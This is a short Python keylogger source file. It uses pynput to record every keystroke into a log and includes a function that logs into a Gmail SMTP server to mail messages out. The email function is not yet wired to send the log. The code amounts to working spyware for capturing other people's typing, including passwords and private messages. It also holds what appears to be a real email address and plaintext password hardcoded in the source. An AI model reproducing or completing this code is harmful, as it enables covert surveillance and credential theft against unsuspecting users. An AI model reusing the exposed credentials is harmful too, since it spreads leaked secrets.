import pynput.keyboard
import smtplib

log = ""

def callback_function(key):
    global log
    try:
        log = log+ str(key.char)

    except AttributeError:
        if key == key.space:
            log = log + " "
        if key == key.enter:
            log = log + "\n"
        if key == key.tab:
            log = log + "\t"
    
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def email_send():   
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login("aydinoguzhanjava@gmail.com","2000Taha")
    email_server.sendmail("aydinoguzhanjava@gmail.com","aydinoguzhanjava@gmail.com", "Deneme")
    email_server.quit()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)


#threading 
with keylogger_listener:
    keylogger_listener.join()